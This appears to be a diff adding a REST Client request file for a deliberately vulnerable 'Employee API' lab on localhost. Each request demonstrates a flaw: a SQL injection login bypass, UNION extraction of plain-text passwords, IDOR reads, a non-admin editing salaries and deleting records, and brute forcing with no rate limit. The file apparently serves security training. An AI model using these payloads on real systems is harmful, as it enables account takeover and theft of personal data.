@@ -1,0 +1,70 @@
+### Vulnerable Employee API — sample requests
+### Works with the VS Code "REST Client" extension, or copy into Postman / Burp Repeater.
+### Base URL assumes the default profile: http://localhost:5080
+
+@base = http://localhost:5080
+
+### 0. Normal login (baseline) — grab a token from the response
+# @name login
+POST {{base}}/api/auth/login
+Content-Type: application/json
+
+{ "username": "alice", "password": "Password1" }
+
+### Use the token from the login above in the requests that need it
+@token = {{login.response.body.token}}
+
+
+### -------------------------------------------------------------------
+### VULN: SQL injection — authentication bypass
+### Logs in as the first user (admin) with no valid password.
+POST {{base}}/api/auth/login
+Content-Type: application/json
+
+{ "username": "' OR '1'='1' --", "password": "x" }
+
+
+### VULN: SQL injection — UNION extraction of credentials via search
+### Pulls usernames + plain-text passwords out through the employee columns.
+GET {{base}}/api/employees/search?name=%25' UNION SELECT Id, Username, Password, Role, 0, '', '' FROM Users --
+Authorization: Bearer {{token}}
+
+
+### -------------------------------------------------------------------
+### VULN: IDOR — read another employee's confidential record by id
+### alice "owns" employee 1, but can read employee 5 (Head of Engineering).
+GET {{base}}/api/employees/5
+Authorization: Bearer {{token}}
+
+
+### VULN: Excessive data exposure — full list incl. salary + NI number
+GET {{base}}/api/employees
+Authorization: Bearer {{token}}
+
+
+### -------------------------------------------------------------------
+### VULN: Broken authorization — non-admin edits anyone's salary
+PUT {{base}}/api/employees/2
+Authorization: Bearer {{token}}
+Content-Type: application/json
+
+{ "fullName": "Bob Chen", "email": "bob@acme.test", "department": "Engineering", "salary": 999999, "nationalInsurance": "CD234567D", "performanceNotes": "edited by a non-admin" }
+
+
+### VULN: Broken authorization — non-admin deletes a record (should be Admin only)
+DELETE {{base}}/api/employees/4
+Authorization: Bearer {{token}}
+
+
+### VULN: Broken authorization — non-admin reads the admin-only user report
+### Also excessive data exposure: returns every user's plain-text password.
+GET {{base}}/api/admin/users
+Authorization: Bearer {{token}}
+
+
+### -------------------------------------------------------------------
+### VULN: Missing rate limiting — repeat this in Burp Intruder / a loop to brute force
+POST {{base}}/api/auth/login
+Content-Type: application/json
+
+{ "username": "admin", "password": "wrong-guess" }
